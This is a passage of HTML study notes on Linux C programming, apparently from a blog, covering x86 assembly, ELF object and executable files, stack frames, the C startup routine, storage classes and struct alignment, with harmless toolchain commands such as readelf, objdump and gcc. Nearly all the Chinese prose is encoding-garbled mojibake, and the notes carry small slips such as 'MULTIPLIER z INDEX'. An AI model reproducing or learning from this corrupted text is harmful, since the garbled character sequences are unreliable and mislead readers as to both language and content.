åœ¨ Linux å†…æ ¸ä¸­ <code>int $0x80</code> è¿™ç§å¼‚å¸¸ç§°ä¸ºç³»ç»Ÿè°ƒç”¨ (System Call).</p><p><code>eax</code> å’Œ <code>ebx</code> æ˜¯ä¼ é€’ç»™ç³»ç»Ÿè°ƒç”¨çš„ä¸¤ä¸ªå‚æ•°, <code>eax</code> æ˜¯ç³»ç»Ÿè°ƒç”¨å·, <code>_exit</code> çš„ç³»ç»Ÿè°ƒç”¨å·æ˜¯ 1, <code>ebx</code> çš„å€¼æ˜¯ä¼ é€’ç»™ <code>_exit</code> çš„å‚æ•°.</p><p>UNIX å¹³å°çš„æ±‡ç¼–å™¨ä¸€ç›´ä½¿ç”¨ AT&amp;T è¯­æ³•.</p><p><mark>å‚è€ƒä¹¦ç±</mark> <a href="http://tldp.org/HOWTO/Assembly-HOWTO/">Linux Assembly HOWTO</a></p><h2 id="17-3-ç¬¬äºŒä¸ªæ±‡ç¼–ç¨‹åº"><a href="#17-3-ç¬¬äºŒä¸ªæ±‡ç¼–ç¨‹åº" class="headerlink" title="17.3 ç¬¬äºŒä¸ªæ±‡ç¼–ç¨‹åº"></a>17.3 ç¬¬äºŒä¸ªæ±‡ç¼–ç¨‹åº</h2><p>å¸¸ç”¨çš„æ•°æ®å£°æ˜:</p><ul><li><code>.long</code> æŒ‡ç¤ºå£°æ˜ä¸€ç»„æ•°, æ¯ä¸ªæ•°å  32 ä½</li><li><code>.byte</code> æŒ‡ç¤ºå£°æ˜ä¸€ç»„æ•°, æ¯ä¸ªæ•°å  8 ä½</li><li><code>ascii</code> æŒ‡ç¤ºå£°æ˜ä¸€ç»„æ•°, æ¯ä¸ªæ•°çš„å–å€¼ä¸ºå¯¹åº”çš„ ASCII ç </li></ul><p><code>cmpl</code> æŠŠä¸¤æ•°ç›¸å‡æ¥åšæ¯”è¾ƒ, ä¸ä¿ç•™ç»“æœ, æ”¹å˜ eflags å¯„å­˜å™¨ä¸­çš„æ ‡å¿—ä½.</p><p><code>je</code> (jump if equal) æ£€æŸ¥ eflags ä¸­çš„ ZF ä½æ¥å†³å®šæ˜¯å¦è·³è½¬.</p><p><code>jle</code> (jump if less than or equal).</p><h2 id="17-4-å¯»å€æ–¹å¼"><a href="#17-4-å¯»å€æ–¹å¼" class="headerlink" title="17.4 å¯»å€æ–¹å¼"></a>17.4 å¯»å€æ–¹å¼</h2><p>å†…å­˜å¯»å€åœ¨æŒ‡ä»¤ä¸­å¯ä»¥è¡¨ç¤ºæˆå¦‚ä¸‹é€šç”¨æ ¼å¼:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">ADDRESS_OR_OFFSET</span><span class="hljs-params">(%BASE_OR_OFFSET,%INDEX,MULTIPLIER)</span></span><br></code></pre></td></tr></table></figure><p>å®ƒæ‰€è¡¨ç¤ºçš„åœ°å€å¯ä»¥è¿™æ ·è®¡ç®—å‡ºæ¥:</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">FINAL <span class="hljs-keyword">ADDRESS </span>= <span class="hljs-keyword">ADDRESS_OR_OFFSET </span>+ <span class="hljs-keyword">BASE_OR_OFFSET </span>+ <span class="hljs-keyword">MULTIPLIER </span>z INDEX<br></code></pre></td></tr></table></figure><p>å…¶ä¸­ ADDRESS_OR_OFFSET å’Œ MULTIPLIER å¿…é¡»æ˜¯å¸¸æ•°, BASE_OR_OFFSET å’Œ INDEX å¿…é¡»æ˜¯å¯„å­˜å™¨. çœç•¥çš„é¡¹ç›¸å½“ä¸æ˜¯ 0.</p><p>å¯»å€æ–¹å¼è§ä¹¦.</p><h2 id="17-5-ELF-æ–‡ä»¶"><a href="#17-5-ELF-æ–‡ä»¶" class="headerlink" title="17.5 ELF æ–‡ä»¶"></a>17.5 ELF æ–‡ä»¶</h2><p>Excutable and Linkable Format.</p><p>å„ç§ UNIX ç³»ç»Ÿçš„å¯æ‰§è¡Œæ–‡ä»¶éƒ½é‡‡ç”¨ ELF æ ¼å¼, å®ƒæœ‰ä»¥ä¸‹ä¸‰ç§ä¸åŒçš„ç±»å‹:</p><ul><li>å¯é‡å®šå‘çš„ç›®æ ‡æ–‡ä»¶ (Relocatable æˆ– Object File)</li><li>å¯æ‰§è¡Œæ–‡ä»¶ (Excutable)</li><li>å…±äº«åº“ (Shared Object, æˆ–è€… Shared Library)</li></ul><p>é“¾æ¥å™¨æŠŠ ELF æ–‡ä»¶çœ‹æˆæ˜¯ Section çš„é›†åˆ, è€ŒåŠ è½½å™¨æŠŠ ELF æ–‡ä»¶çœ‹æˆæ˜¯ Segment çš„é›†åˆ.</p><p>Section Header Table ä¸­ä¿å­˜äº†æ‰€æœ‰ Section çš„æè¿°ä¿¡æ¯. </p><p>Program Header Table ä¿å­˜äº†æ‰€æœ‰ Segment çš„æè¿°ä¿¡æ¯.</p><p>Section Header Table å’Œ Program Header Table å¹¶ä¸ä¸€å®šä½äºæ–‡ä»¶çš„å¼€å¤´å’Œç»“å°¾, å…¶ä½ç½®ç”± ELF Header æŒ‡å‡º.</p><p>ç›®æ ‡æ–‡ä»¶éœ€è¦é“¾æ¥å™¨åšè¿›ä¸€æ­¥å¤„ç†, æ‰€ä»¥ä¸€å®šæœ‰ Section Header Table, å¯æ‰§è¡Œæ–‡ä»¶éœ€è¦å®¶åœ¨è¿›è¡Œ, æ‰€ä»¥ä¸€å®šæœ‰ Program Header Table, å…±äº«åº“æ—¢è¦åŠ è½½è¿è¡Œ, åˆè¦åœ¨åŠ è½½æ—¶åšåŠ¨æ€é“¾æ¥, æ‰€ä»¥æ—¢æœ‰ Section Header Table åˆæœ‰ Program Header Table.</p><h3 id="17-5-1-ç›®æ ‡æ–‡ä»¶"><a href="#17-5-1-ç›®æ ‡æ–‡ä»¶" class="headerlink" title="17.5.1 ç›®æ ‡æ–‡ä»¶"></a>17.5.1 ç›®æ ‡æ–‡ä»¶</h3><p>å¯ä»¥ç”¨ <code>readelf</code> å·¥å…·è¯»å‡ºç›®æ ‡æ–‡ä»¶çš„ ELF Header å’Œ Section Header Table.</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> readelf -a <span class="hljs-built_in">max</span>.o<br></code></pre></td></tr></table></figure><p>ç”¨ hexdump å‘½ä»¤æ‰“å°ç›®æ ‡æ–‡ä»¶çš„å…¨éƒ¨å­—èŠ‚:</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> hexdump -C <span class="hljs-built_in">max</span>.o<br></code></pre></td></tr></table></figure><p><code>.bss</code> æ®µä¸­å­˜æ”¾çš„æ˜¯ C è¯­è¨€ä¸­æ²¡æœ‰åˆå§‹åŒ–çš„å…¨å±€å˜é‡. å…¶åœ¨ ELF æ–‡ä»¶ä¸­ä¸å ç”¨ç©ºé—´.</p><p>åœ¨æ±‡ç¼–ç¨‹åºä¸­ç”¨ <code>.globl</code> æŒ‡ç¤ºå£°æ˜è¿‡çš„ç¬¦å·ä¼šæˆä¸ºå…¨å±€ç¬¦å·, å¦åˆ™æˆä¸ºå±€éƒ¨ç¬¦å·.</p><p>objdump å·¥å…·å¯ä»¥æŠŠç¨‹åºä¸­çš„æœºå™¨æŒ‡ä»¤åæ±‡ç¼– (Disassemble):</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> objdump -d <span class="hljs-built_in">max</span>.o<br></code></pre></td></tr></table></figure><h3 id="17-5-2-å¯æ‰§è¡Œæ–‡ä»¶"><a href="#17-5-2-å¯æ‰§è¡Œæ–‡ä»¶" class="headerlink" title="17.5.2 å¯æ‰§è¡Œæ–‡ä»¶"></a>17.5.2 å¯æ‰§è¡Œæ–‡ä»¶</h3><p><code>.rel.text</code> ç”¨äºé“¾æ¥è¿‡ç¨‹, åšå®Œé“¾æ¥ä¹‹åä¼šè¢«åˆ æ‰.</p><p>x86 å¹³å°ä¸Šåé¢çš„ PhysAddr åˆ—æ˜¯æ²¡æœ‰æ„ä¹‰çš„, å¹¶ä¸ä»£è¡¨å®é™…çš„ç‰©ç†åœ°å€.</p><p>MMU çš„æƒé™ä¿æŠ¤æœºåˆ¶æ˜¯ä»¥é¡µä¸ºå•ä½, ä¸€ä¸ªé¡µé¢åªèƒ½è®¾ç½®ä¸€ç§æƒé™.</p><p>ä¸ºäº†ç®€åŒ–é“¾æ¥å™¨å’ŒåŠ è½½å™¨çš„å®ç°, è¿˜è§„å®šæ¯ä¸ª Segment åœ¨æ–‡ä»¶çš„é¡µé¢ä¸­åç§»å¤šå°‘åŠ è½½åˆ°å†…å­˜é¡µé¢ä¸­ä¹Ÿè¦åç§»å¤šå°‘.</p><p>strip å‘½ä»¤å¯ä»¥å»é™¤å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„ç¬¦å·ä¿¡æ¯, è¿™æ ·å¯ä»¥æœ‰æ•ˆå‡å°æ–‡ä»¶çš„å°ºå¯¸è€Œä¸å½±å“è¿è¡Œ:</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> strip <span class="hljs-built_in">max</span><br></code></pre></td></tr></table></figure><p>ä¸è¦å¯¹ç›®æ ‡æ–‡ä»¶å’Œå…±äº«åº“ä½¿ç”¨ strip å‘½ä»¤, å› ä¸ºé“¾æ¥å™¨éœ€è¦åˆ©ç”¨ç›®æ ‡æ–‡ä»¶å’Œå…±äº«åº“ä¸­çš„ç¬¦å·ä¿¡æ¯æ¥åšé“¾æ¥.</p><h1 id="ç¬¬18ç« -æ±‡ç¼–ä¸-C-ä¹‹é—´çš„å…³ç³»"><a href="#ç¬¬18ç« -æ±‡ç¼–ä¸-C-ä¹‹é—´çš„å…³ç³»" class="headerlink" title="ç¬¬18ç«  æ±‡ç¼–ä¸ C ä¹‹é—´çš„å…³ç³»"></a>ç¬¬18ç«  æ±‡ç¼–ä¸ C ä¹‹é—´çš„å…³ç³»</h1><p>gcc è¿˜æä¾›äº†ä¸€ç§æ‰©å±•è¯­æ³•å¯ä»¥åœ¨ C ç¨‹åºä¸­å†…åµŒæ±‡ç¼–æŒ‡ä»¤.</p><h2 id="18-1-å‡½æ•°è°ƒç”¨"><a href="#18-1-å‡½æ•°è°ƒç”¨" class="headerlink" title="18.1 å‡½æ•°è°ƒç”¨"></a>18.1 å‡½æ•°è°ƒç”¨</h2><p>å¦‚æœåœ¨ç¼–è¯‘æ—¶åŠ ä¸Š <code>-g</code> é€‰é¡¹, é‚£ä¹ˆç”¨ objdump åæ±‡ç¼–æ—¶å¯ä»¥æŠŠ C ä»£ç å’Œæ±‡ç¼–ä»£ç ç©¿æ’èµ·æ¥æ˜¾ç¤º.</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>gcc main.c -g<br><span class="hljs-variable">$ </span>objdump -dS a.<span class="hljs-keyword">out</span><br></code></pre></td></tr></table></figure><p>è¦æŸ¥çœ‹ç¼–è¯‘åçš„æ±‡ç¼–ä»£ç , å¯ä»¥ç”¨ <code>gcc -S main.c</code> è¿™æ ·åªç”Ÿæˆæ±‡ç¼–ä»£ç  main.s, è€Œä¸ç”ŸæˆäºŒè¿›åˆ¶çš„ç›®æ ‡æ–‡ä»¶.</p><p>åœ¨ç”¨ gdb è°ƒè¯•æ—¶, å¯ä»¥ç”¨ disassemble å‘½ä»¤åæ±‡ç¼–. å¦‚æœ disassemble å‘½ä»¤åé¢è·Ÿå‡½æ•°åæˆ–åœ°å€åˆ™åæ±‡ç¼–æŒ‡å®šçš„å‡½æ•°.</p><p>si å‘½ä»¤å¯ä»¥é€æ¡æŒ‡ä»¤ (åº”è¯¥æ˜¯æ±‡ç¼–æŒ‡ä»¤) è¿›è¡Œå•æ­¥è°ƒè¯•. info registers å¯ä»¥æ˜¾ç¤ºæ‰€æœ‰å¯„å­˜å™¨çš„å½“å‰å€¼. åœ¨ gdb ä¸­è¡¨ç¤ºå¯„å­˜å™¨åæ—¶å‰é¢è¦åŠ  <code>$</code>, å¦‚ <code>(gdb) p $esp</code>. <code>(gdb) x/20 $esp</code> å‘½ä»¤å¯ä»¥æŸ¥çœ‹å†…å­˜ä¸­ä» 0xbff1c3f4 åœ°å€å¼€å§‹çš„ 20 ä¸ª 32 ä½æ•°.</p><p>åœ¨æ‰§è¡Œç¨‹åºæ—¶, æ“ä½œç³»ç»Ÿä¸ºè¿›ç¨‹åˆ†é…ä¸€å—æ ˆç©ºé—´æ¥ä¿å­˜å‡½æ•°æ ˆå¸§, esp (Stack Pointer) å¯„å­˜å™¨æ€»æ˜¯æŒ‡å‘æ ˆé¡¶, åœ¨ x86 å¹³å°ä¸Šè¿™ä¸ªæ ˆæ˜¯ä»é«˜åœ°å€å‘ä½åœ°å€å¢é•¿çš„.</p><p>Linux å†…æ ¸ä¸ºæ¯ä¸ªæ–°è¿›ç¨‹æŒ‡å®šçš„æ ˆç©ºé—´çš„èµ·å§‹åœ°å€éƒ½ä¼šæœ‰äº›ä¸åŒ, æ‰€ä»¥æ¯æ¬¡è¿è¡Œè¿™ä¸ªç¨‹åºå¾—åˆ°çš„åœ°å€éƒ½ä¸ä¸€æ ·.</p><p><mark>å‚æ•°æ˜¯ä»å³å‘å·¦ä¾æ¬¡å‹æ ˆçš„.</mark> </p><p>è¿™é‡Œæ ˆæŒ‡é’ˆæ¯æ¬¡å‡å››æ˜¯å› ä¸ºæ•°æ®ä¸º int ç±»å‹, å å››ä¸ªå­—èŠ‚.</p><p>åœ¨æ¯ä¸ªå‡½æ•°çš„æ ˆå¸§ä¸­, <code>ebp</code> (Base Pointer) æŒ‡å‘æ ˆåº•, <code>esp</code> æŒ‡å‘æ ˆé¡¶. å‡½æ•°çš„å‚æ•°å’Œå±€éƒ¨å˜é‡éƒ½æ˜¯é€šè¿‡ <code>ebp</code> çš„å€¼åŠ ä¸Šä¸€ä¸ªåç§»é‡æ¥è®¿é—®.</p><p>åœ¨ gdb ä¸­å¯ä»¥ç”¨ bt å‘½ä»¤å’Œ frame å‘½ä»¤æŸ¥çœ‹æ¯å±‚æ ˆå¸§ä¸Šçš„å‚æ•°å’Œå±€éƒ¨å˜é‡.</p><p>bar å‡½æ•°æœ‰ä¸€ä¸ª int å‹çš„è¿”å›å€¼, è¿™ä¸ªè¿”å›å€¼æ˜¯é€šè¿‡ eax å¯„å­˜å™¨ä¼ é€’çš„.</p><h2 id="18-2-main-å‡½æ•°-å¯åŠ¨ä¾‹ç¨‹å’Œé€€å‡ºçŠ¶æ€"><a href="#18-2-main-å‡½æ•°-å¯åŠ¨ä¾‹ç¨‹å’Œé€€å‡ºçŠ¶æ€" class="headerlink" title="18.2 main å‡½æ•°, å¯åŠ¨ä¾‹ç¨‹å’Œé€€å‡ºçŠ¶æ€"></a>18.2 main å‡½æ•°, å¯åŠ¨ä¾‹ç¨‹å’Œé€€å‡ºçŠ¶æ€</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">gcc <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.c</span> -o <span class="hljs-selector-tag">main</span><br></code></pre></td></tr></table></figure><p>è¿™æ¡å‘½ä»¤å®é™…å¯ä»¥åˆ†ä¸ºä¸‰æ¡å‘½ä»¤æ¥åš:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$ gcc -S <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.c</span> <br>$ gcc -c <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.s</span> <br>$ gcc <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.o</span> <br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>-v</code> é€‰é¡¹å¯ä»¥äº†è§£è¯¦ç»†çš„ç¼–è¯‘è¿‡ç¨‹:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$ gcc -v <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.c</span> -o main<br></code></pre></td></tr></table></figure><p>gcc åªæ˜¯ä¸€ä¸ªå¤–å£³è€Œä¸æ˜¯çœŸæ­£çš„ç¼–è¯‘å™¨, çœŸæ­£çš„ C ç¼–è¯‘å™¨æ˜¯ <code>/usr/lib/gcc/x86_64-pc-linux-gnu/12.2.0/cc1</code> (æ¯ä¸ª Linux ç‰ˆæœ¬çš„ä½ç½®ä¼šæœ‰äº›è®¸å‡ºå…¥), gcc è°ƒç”¨ C ç¼–è¯‘å™¨, æ±‡ç¼–å™¨å’Œé“¾æ¥å™¨å®Œæˆ C ä»£ç çš„ç¼–è¯‘é“¾æ¥å·¥ä½œ.</p><p>æŸ¥çœ‹ç¼–è¯‘å™¨æä¾›çš„ç›®æ ‡æ–‡ä»¶é‡Œéƒ½æœ‰ä»€ä¹ˆ (è¿™é‡ŒæŸ¥çœ‹ç¬¦å·è¡¨):</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ nm <span class="hljs-regexp">/usr/</span>lib/crt1.o<br></code></pre></td></tr></table></figure><p>æˆ–:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>readelf -s crt1.o<br></code></pre></td></tr></table></figure><p>ç¬¦å·è¡¨çš„æ¯ä¸€è¡Œç”±åœ°å€, ç¬¦å·ç±»å‹å’Œç¬¦å·åç»„æˆ.</p><p>ç¬¦å·ç±»å‹ç”¨ä¸€ä¸ªå­—æ¯è¡¨ç¤º, å¤§å†™å­—æ¯æ˜¯å…¨å±€ç¬¦å·, å°å†™å­—æ¯æ˜¯å±€éƒ¨ç¬¦å·, å…·ä½“å«ä¹‰å¯æŸ¥ <code>man 1 nm</code>.</p><p><code>T</code> è¡¨ç¤º Text, <code>U</code> è¡¨ç¤º Undefined.</p><p>C ç¨‹åºçš„å…¥å£ è¡¨ç¤º Undefined.</p><p>C ç¨‹åºçš„å…¥å£å…¶å®æ˜¯ <code>crt1.o</code> æä¾›çš„ <code>_start</code>, å®ƒé¦–å…ˆåšä¸€äº›åˆå§‹åŒ–å·¥ä½œ, ç„¶åè°ƒç”¨æˆ‘ä»¬ç¼–å†™çš„ <code>main</code> å‡½æ•°.</p><p>ç”¨åæ±‡ç¼–æ¥æŸ¥çœ‹ä¸€ä¸‹ <code>_start</code> çš„å®šä¹‰:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ objdump -d <span class="hljs-regexp">/usr/</span>lib/crt1.o<br></code></pre></td></tr></table></figure><p>ä¸€ä¸ªç›®æ ‡æ–‡ä»¶ä¸­å¼•ç”¨äº†æŸä¸ªç¬¦å·, é“¾æ¥å™¨åœ¨å¦ä¸€ä¸ªç›®æ ‡æ–‡ä»¶ä¸­æ‰¾åˆ°è¿™ä¸ªç¬¦å·çš„å®šä¹‰å¹¶ç¡®å®šå®ƒçš„åœ°å€, è¿™ä¸ªè¿‡ç¨‹å«åš <mark>ç¬¦å·è§£æ</mark> (Symble Resolution)</p><p>ç¬¦å·è§£æå’Œé‡å®šä½éƒ½æ˜¯é€šè¿‡ä¿®æ”¹æŒ‡ä»¤ä¸­çš„åœ°å€å®ç°çš„,</p><p>é“¾æ¥å™¨ä¹Ÿæ˜¯ä¸€ç§ç¼–è¾‘å™¨, å…¶ç¼–è¾‘çš„æ˜¯ç›®æ ‡æ–‡ä»¶, æ‰€ä»¥é“¾æ¥å™¨å«åš Link Editor.</p><p>å°±æ˜¯æŠŠå…¶ä»–ç›®æ ‡æ–‡ä»¶é“¾æ¥åˆ° <code>crt1.o</code> ä¸­.</p><p>æœ€åä¸€ä¸ªå‹æ ˆçš„å‚æ•° <code>push $0x80483c4</code> æ­£æ˜¯ main å‡½æ•°çš„åœ°å€, <code>__libc_start_main</code> åœ¨åšå®Œåˆå§‹åŒ–å·¥ä½œä¹‹åä¼šæ ¹æ®è¿™ä¸ªå‚æ•°è°ƒç”¨ main å‡½æ•°.</p><p>ç”±äº main å‡½æ•°æ˜¯è¢«å¯åŠ¨ä¾‹ç¨‹ (startup Route, ä¹Ÿå°±æ˜¯ <code>_start</code>) è°ƒç”¨çš„, æ‰€ä»¥ä» main å‡½æ•° return æ—¶å°±è¿”å›åˆ°å¯åŠ¨ä¾‹ç¨‹ä¸­, main å‡½æ•°çš„è¿”å›å€¼å°±è¢«å¯åŠ¨ä¾‹ç¨‹å¾—åˆ°, å¦‚æœå°†å¯åŠ¨ä¾‹ç¨‹è¡¨ç¤ºæˆç­‰ä»·çš„ C ä»£ç  (å®é™…ä¸Šå¯åŠ¨ä¾‹ç¨‹ä¸€èˆ¬æ˜¯ç›´æ¥ç”¨æ±‡ç¼–è¯­è¨€ç¼–å†™çš„), åˆ™å®ƒè°ƒç”¨ main å‡½æ•°çš„å½¢å¼æ˜¯: </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">exit</span>(main(argc, argv));<br></code></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´, å¯åŠ¨ä¾‹ç¨‹å¾—åˆ° main å‡½æ•°çš„è¿”å›å€¼å, ä¼šç«‹å³ç”¨å®ƒåšå‚æ•°è°ƒç”¨ exit å‡½æ•°.</p><p>ä½¿ç”¨ <code>exit</code> å‡½æ•°è¦åŒ…å« <code>stdlib.h</code> å¤´æ–‡ä»¶.</p><h2 id="18-3-å˜é‡çš„å­˜å‚¨å¸ƒå±€"><a href="#18-3-å˜é‡çš„å­˜å‚¨å¸ƒå±€" class="headerlink" title="18.3 å˜é‡çš„å­˜å‚¨å¸ƒå±€"></a>18.3 å˜é‡çš„å­˜å‚¨å¸ƒå±€</h2><p>å­—ç¬¦ä¸²å­—é¢å€¼æ˜¯åªè¯», ç›¸å½“äºåœ¨å…¨å±€ä½œç”¨åŸŸå®šä¹‰äº†ä¸€ä¸ª const æ•°ç»„.</p><p>const å˜é‡åœ¨å®šä¹‰æ—¶å¿…é¡»åˆå§‹åŒ–, å› ä¸ºåªæœ‰åœ¨åˆå§‹åŒ–æ—¶æ‰æœ‰æœºä¼šç»™å®ƒä¸€ä¸ªå€¼.</p><p>é“¾æ¥å™¨ä¸ä¼šå¯¹å±€éƒ¨ç¬¦å·åšç¬¦å·è§£æ.</p><p>ä¸€ä¸ªå‡½æ•°å®šä¹‰å‰é¢ä¹Ÿå¯ä»¥ç”¨ static ä¿®é¥°, è¡¨ç¤ºè¿™ä¸ªå‡½æ•°åæ˜¯å±€éƒ¨ç¬¦å·.</p><p>è™½ç„¶æ ˆæ˜¯ä»é«˜åœ°å€å‘ä½åœ°å€å¢é•¿çš„, ä½†æ•°ç»„æ€»æ˜¯ä»ä½åœ°å€å‘é«˜åœ°å€æ’åˆ—.</p><p><code>register</code> å…³é”®è¯çš„ä½œç”¨å°±æ˜¯, æŒ‡ç¤ºç¼–è¯‘å™¨å°½å¯èƒ½åˆ†é…ä¸€ä¸ªå¯„å­˜å™¨æ¥ä¿å­˜è¿™ä¸ªå˜é‡.</p><p>C è¯­è¨€ä¸­ä½œç”¨åŸŸçš„åˆ†ç±», è§ä¹¦.</p><p>å‘½åç©ºé—´çš„åˆ†ç±» (éƒ¨åˆ†):</p><ul><li>struct, enum, union çš„ Tag å±äºä¸€ä¸ªå‘½åç©ºé—´</li><li>struct å’Œ union çš„æˆå‘˜åå±äºä¸€ä¸ªå‘½åç©ºé—´</li><li>å…¶ä»–æ‰€æœ‰æ ‡è¯†ç¬¦, å¦‚å˜é‡å, å‡½æ•°å, å®å®šä¹‰, typedef å®šä¹‰çš„ç±»å‹å, enum æˆå‘˜ç­‰éƒ½å±äºä¸€ä¸ªå‘½åç©ºé—´.</li></ul><p>é“¾æ¥å±æ€§.</p><p>å­˜å‚¨ç±»ä¿®é¥°ç¬¦ (Storage Class Specifier):</p><ul><li>auto, ç”¨å®ƒä¿®é¥°çš„å˜é‡åœ¨å‡½æ•°è°ƒç”¨æ—¶è‡ªåŠ¨åœ¨æ ˆä¸Šåˆ†é…å­˜å‚¨ç©ºé—´, å‡½æ•°è¿”å›æ—¶è‡ªåŠ¨é‡Šæ”¾, auto å¯ä»¥çœç•¥ä¸å†™, ä¸”ä¸èƒ½ä¿®é¥°æ–‡ä»¶ä½œç”¨åŸŸçš„å˜é‡.</li><li>register, ä¹Ÿä¸èƒ½ä¿®é¥°æ–‡ä»¶ä½œç”¨åŸŸçš„å˜é‡.</li><li>typedef, å…¶å£°æ˜çš„çœ‹æ³•å¦‚ä¸‹, å…ˆå»æ‰ typedef æŠŠå®ƒçœ‹æˆå˜é‡å£°æ˜, çœ‹è¿™ä¸ªå˜é‡æ˜¯ä»€ä¹ˆç±»å‹çš„, åˆ™ typedef å°±ç»™ä»€ä¹ˆç±»å‹èµ·ä¸€ä¸ªç±»å‹å</li></ul><p>typedef çš„ä¾‹å­:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> buffer[<span class="hljs-number">100</span>];<br></code></pre></td></tr></table></figure><p>å…ˆå»æ‰ typedef, å°±å˜æˆ:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-type">char</span> buffer[<span class="hljs-number">100</span>];<br></code></pre></td></tr></table></figure><p><code>buffer</code> çš„ç±»å‹æ˜¯ <code>char [100]</code> å³é•¿åº¦ä¸º 100 çš„å­—ç¬¦æ•°ç»„, é‚£ä¹ˆ <code>buffer</code> å°±æ˜¯é•¿åº¦ä¸º 100 çš„å­—ç¬¦æ•°ç»„çš„åˆ«å.</p><p>å˜é‡ç”Ÿå­˜æœŸ (Storage Duration, æˆ–è€… Lifetime) åˆ†ä¸º:</p><ul><li>é™æ€ç”Ÿå­˜æœŸ. åœ¨ç¨‹åºå¼€å§‹æ‰§è¡Œæ—¶åˆ†é…å†…å­˜å’Œåˆå§‹åŒ–, æ­¤åä¾¿ä¸€ç›´å­˜åœ¨ç›´åˆ°ç¨‹åºç»“æŸ, é€šå¸¸ä½äº <code>.rodata</code>, <code>.data</code>, æˆ– <code>.bss</code> æ®µ.</li><li>è‡ªåŠ¨ç”Ÿå­˜æœŸ</li><li>åŠ¨æ€ç”Ÿå­˜æœŸ</li></ul><h2 id="18-4-ç»“æ„ä½“å’Œè”åˆä½“"><a href="#18-4-ç»“æ„ä½“å’Œè”åˆä½“" class="headerlink" title="18.4 ç»“æ„ä½“å’Œè”åˆä½“"></a>18.4 ç»“æ„ä½“å’Œè”åˆä½“</h2><p>ç»“æ„ä½“çš„å„æˆå‘˜å¹¶ä¸æ˜¯ä¸€ä¸ªç´§æŒ¨ç€ä¸€ä¸ªæ’åˆ—çš„, ä¸­é—´æœ‰ç©ºéš™, ç§°ä¸ºå¡«å…… (Padding). </p><p>å¤§å¤šæ•°è®¡ç®—æœºä½“ç³»ç»“æ„å¯¹äºè®¿é—®å†…å­˜çš„æŒ‡ä»¤æ˜¯æœ‰é™åˆ¶çš„, åœ¨ 32 ä½å¹³å°ä¸Š, å¦‚æœä¸€æ¡æŒ‡ä»¤è®¿é—® 4 ä¸ªå­—èŠ‚, èµ·å§‹å†…å­˜åœ°å€åº”è¯¥æ˜¯ 4 çš„æ•´æ•°å€, å¦‚æœä¸€æ¡æŒ‡ä»¤è®¿é—®ä¸¤ä¸ªå­—èŠ‚, èµ·å§‹å†…å­˜åœ°å€åº”è¯¥æ˜¯ 2 çš„æ•´æ•°å€, è¿™è¢«ç§°ä¸ºå¯¹é½ (Alignment), è®¿é—®ä¸€ä¸ªå­—èŠ‚çš„æŒ‡ä»¤æ²¡æœ‰å¯¹é½è¦æ±‚.</p><p>æ²¡æœ‰å¯¹é½å¯èƒ½ä¼šå¯¼è‡´æ— æ³•è®¿é—®å†…å­˜æˆ–æ•ˆç‡æ›´ä½.</p><p>è¦æ³¨æ„æœ€åä¸€ä¸ªå…ƒç´ çš„å¡«å……. å…¶å’Œç¬¬ä¸€ä¸ªå…ƒç´ çš„éœ€æ±‚ç›¸å…³. </p><p>åˆç†è®¾è®¡ç»“æ„ä½“å„æˆå‘˜çš„æ’åˆ—é¡ºåºå¯ä»¥èŠ‚çœå­˜å‚¨ç©ºé—´.</p><p>ä¸€ä¸ªè”åˆä½“çš„å„ä¸ªæˆå‘˜å ç”¨ç›¸åŒçš„å†…å­˜ç©ºé—´, è”åˆä½“çš„é•¿åº¦ç­‰äºå…¶ä¸­æœ€é•¿æˆå‘˜çš„é•¿åº¦.</p><p>è”åˆä½“å¦‚æœç”¨ Initializer åˆå§‹åŒ–, åˆ™åªåˆå§‹åŒ–å®ƒçš„ç¬¬ä¸€ä¸ªæˆå‘˜. å¦‚</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 